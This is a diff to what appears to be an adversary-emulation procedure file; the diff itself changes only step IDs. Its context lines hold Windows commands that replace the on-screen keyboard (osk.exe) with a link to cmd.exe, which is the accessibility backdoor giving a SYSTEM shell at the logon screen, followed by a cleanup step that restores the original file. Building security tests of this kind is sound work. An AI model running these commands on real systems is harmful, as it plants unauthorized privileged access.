@@ -7,7 +7,7 @@
   ],
   "steps": [
     {
-      "id": "c96fce74-e94b-44a4-9929-7611c2039e10",
+      "id": "2957ccb8-8f72-5e93-8b36-c7ef01b81252",
       "type": "execute-command",
       "data": {
         "command": "IF NOT EXIST %windir%\\System32\\osk.exe.bak (copy %windir%\\System32\\osk.exe %windir%\\System32\\osk.exe.bak) ELSE ( pushd )\ntakeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\nmklink %windir%\\System32\\osk.exe %windir%\\System32\\cmd.exe",
@@ -16,7 +16,7 @@
       "elevation_required": true
     },
     {
-      "id": "2088e04e-e9fb-4b1d-8123-0b3c96812d68",
+      "id": "4db47f8c-8766-5f06-9880-9453ae4344a1",
       "type": "execute-command",
       "data": {
         "command": "takeown /F %windir%\\System32\\osk.exe /A\nicacls %windir%\\System32\\osk.exe /grant Administrators:F /t\ndel %windir%\\System32\\osk.exe\ncopy /Y %windir%\\System32\\osk.exe.bak %windir%\\System32\\osk.exe\nicacls %windir%\\system32\\osk.exe /inheritance:d\nicacls %windir%\\system32\\osk.exe /setowner \"NT SERVICE\\TrustedInstaller\"\nicacls %windir%\\System32\\osk.exe /grant \"NT SERVICE\\TrustedInstaller\":F /t\nicacls %windir%\\system32\\osk.exe /grant:r SYSTEM:RX\nicacls %windir%\\system32\\osk.exe /grant:r Administrators:RX",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "c96fce74-e94b-44a4-9929-7611c2039e10",
+      "s": "2957ccb8-8f72-5e93-8b36-c7ef01b81252",
       "p": "on-success",
-      "o": "2088e04e-e9fb-4b1d-8123-0b3c96812d68"
+      "o": "4db47f8c-8766-5f06-9880-9453ae4344a1"
     },
     {
-      "s": "c96fce74-e94b-44a4-9929-7611c2039e10",
+      "s": "2957ccb8-8f72-5e93-8b36-c7ef01b81252",
       "p": "on-failure",
-      "o": "2088e04e-e9fb-4b1d-8123-0b3c96812d68"
+      "o": "4db47f8c-8766-5f06-9880-9453ae4344a1"
     }
   ],
   "tags": [
